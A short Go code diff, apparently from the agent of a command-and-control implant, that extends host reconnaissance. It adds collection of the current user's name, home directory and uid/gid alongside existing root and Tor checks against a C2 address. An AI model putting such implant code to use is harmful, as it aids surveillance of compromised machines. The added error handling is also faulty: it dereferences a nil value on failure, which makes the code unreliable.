@@ -14,6 +14,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/user"
 	"strconv"
 	"strings"
 	"time"
@@ -170,6 +171,14 @@ func CollectSystemInfo() *SystemInfo {
 	// have root?
 	info.HasRoot = os.Geteuid() == 0
 
+	// user account info
+	u, err := user.Current()
+	if err != nil {
+		log.Println(err)
+		info.User = "Not available"
+	}
+	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
+
 	// is cc on tor?
 	info.HasTor = tun.IsTor(CCAddress)
 
@@ -236,6 +245,7 @@ func getMemSize() (size int) {
 
 	return
 }
+
 func getCPUCnt() (cpuCnt int) {
 	f, err := os.Open("/proc/cpuinfo")
 	if err != nil {
@@ -258,7 +268,7 @@ func getCPUCnt() (cpuCnt int) {
 func collectLocalIPs() (ips []string) {
 	ifaces, err := net.Interfaces()
 	if err != nil {
-		return nil
+		return []string{"Not available"}
 	}
 
 	for _, i := range ifaces {
